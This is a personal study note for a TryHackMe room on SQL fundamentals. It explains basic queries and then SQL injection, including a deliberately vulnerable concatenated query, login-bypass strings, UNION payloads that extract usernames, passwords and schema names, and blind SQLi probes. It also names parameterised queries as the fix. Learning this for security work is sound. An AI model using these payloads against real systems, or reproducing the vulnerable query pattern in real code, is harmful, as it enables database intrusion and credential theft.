---
tags: [THM, cyber-security-101, web-hacking, SQL, SQLi, room]
platform: TryHackMe
type: room
module: "08 - Web Hacking"
module_number: 8
room_number: 32
status: "⬜"
url: https://tryhackme.com/room/sqlfundamentals
difficulty: Easy
---

# 🗄️ SQL Fundamentals

> [!abstract] Summary
> Learn SQL — the language databases speak — and how misuse enables SQL Injection attacks. Covers SELECT/INSERT/UPDATE/DELETE and UNION-based SQL injection.

**Path:** [[Cyber Security 101]] > Module 8 > SQL Fundamentals

## 🎯 Learning Objectives
- Write SQL queries (SELECT, INSERT, UPDATE, DELETE)
- Understand how SQL injection occurs
- Perform manual SQL injection
- Retrieve data via UNION attacks

## 📖 Key Concepts

### SQL Fundamentals
```sql
-- Select
SELECT * FROM users;
SELECT username, password FROM users WHERE id = 1;

-- Filter & sort
SELECT * FROM users WHERE admin = 1 ORDER BY username ASC;

-- Join
SELECT u.username, o.order_id FROM users u
JOIN orders o ON u.id = o.user_id;

-- Insert / Update / Delete
INSERT INTO users (username, password) VALUES ('alice', 'hash');
UPDATE users SET password = 'newhash' WHERE id = 1;
DELETE FROM users WHERE id = 5;
```

### SQL Injection
When user input is inserted unsanitised into SQL query:
```python
# Vulnerable code
query = "SELECT * FROM users WHERE username = '" + user_input + "'"

# Payload: admin'--
# Query becomes: SELECT * FROM users WHERE username = 'admin'--'
# Everything after -- is commented out → login bypass
```

### Authentication Bypass
```
Username: admin'--
Username: ' OR 1=1--
Username: ' OR '1'='1
```

### UNION Injection
Append results from other tables:
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--    (increase until error)

-- Extract data
' UNION SELECT username, password FROM users--
' UNION SELECT null, table_name FROM information_schema.tables--
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi
No output visible — infer results from true/false:
```sql
' AND 1=1--   (true = page loads normally)
' AND 1=2--   (false = page changes)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
```

> [!warning] SQL injection can lead to authentication bypass, data exfiltration, database modification, and in some cases RCE. **Prevention:** parameterised queries (prepared statements) — the only reliable fix.

## 🔑 Key Takeaways
- SQL injection is caused by string concatenation of user input — always parameterise
- `'--` tests for basic SQLi, `' OR 1=1--` bypasses auth
- UNION attack extracts data from other tables
- SQLMap automates SQLi detection and exploitation

## 🔗 Related Notes
- [[CS101-37 - SQLMap The Basics]] · [[CS101-33 - Burp Suite The Basics]]
- [[SQL Injection]] · [[UNION Attack]] · [[OWASP Top 10]] · [[CS101-54 - OWASP Top 10 2025 IAAA Failures]]
